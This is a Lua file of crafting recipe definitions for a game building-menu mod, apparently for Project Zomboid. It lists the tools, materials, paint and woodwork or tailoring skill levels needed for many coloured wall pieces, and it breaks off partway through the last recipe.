if not getBuildingMenuInstance then
    require("BuildingMenu01_Main")
end

---@class BuildingMenu
local BuildingMenu = getBuildingMenuInstance()


BuildingMenu.GreyBigStoneWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGrey",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.GreySmallStoneWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGrey",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.GreenBigFabricWallRecipe = {
    neededTools = {
        "Hammer",
        "Needle",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.RippedSheets",
            Amount = 10
        },
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 30
        },
        {
            Skill = "Tailoring",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.GreenSmallFabricWallRecipe = {
    neededTools = {
        "Hammer",
        "Needle",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.RippedSheets",
            Amount = 6
        },
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        },        
        {
            Consumable = "Base.Thread",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 25
        },
        {
            Skill = "Tailoring",
            Level = 3,
            Xp = 10
        }
    }
}


BuildingMenu.YellowBigFabricWallRecipe = {
    neededTools = {
        "Hammer",
        "Needle",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.RippedSheets",
            Amount = 10
        },
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 30
        },
        {
            Skill = "Tailoring",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.YellowSmallFabricWallRecipe = {
    neededTools = {
        "Hammer",
        "Needle",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.RippedSheets",
            Amount = 6
        },
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        },        
        {
            Consumable = "Base.Thread",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 25
        },
        {
            Skill = "Tailoring",
            Level = 3,
            Xp = 10
        }
    }
}

BuildingMenu.TanBigStoneWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintLightBrown",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.TanSmallStoneWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintLightBrown",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.RedBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.RedSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.OldBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.OldSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.OrangeBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.OrangeSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BlueBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BlueSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BeigeBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BeigeSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.WhiteBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.WhiteSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.PurpleBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPurple",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.PurpleSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPurple",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.GreenBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.GreenSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BrownBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BrownSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BlueBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BlueSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.TanBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintLightBrown",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.TanSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintLightBrown",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.PinkBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPink",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.PinkSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPink",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.TurquoiseBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.TurquoiseSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.TurquoiseBigBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.TurquoiseSmallBrickWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.WhiteBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.WhiteSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.YellowBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.YellowSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.BrownBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BrownBigWoodWindowWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BrownSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BigWoodWallRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.SmallWoodWallRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.RedBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.RedBigWindowWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.RedSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.GreenBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.GreenSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.PurpleBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPurple",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.PurpleSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPurple",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.GreyBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGrey",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.GreySmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGrey",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.OrangeBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.OrangeSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.CreamBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPink",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.CreamSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPink",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.BlackBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlack",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BlackBigWoodWindowWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlack",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.BlackSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlack",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BlackSmallWoodGlassWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlack",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.BlackWhiteBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlack",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.BlackWhiteSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBlack",
            Amount = 1
        },
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.WhiteTurquoiseBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.WhiteTurquoiseWindowBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.WhiteTurquoiseSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
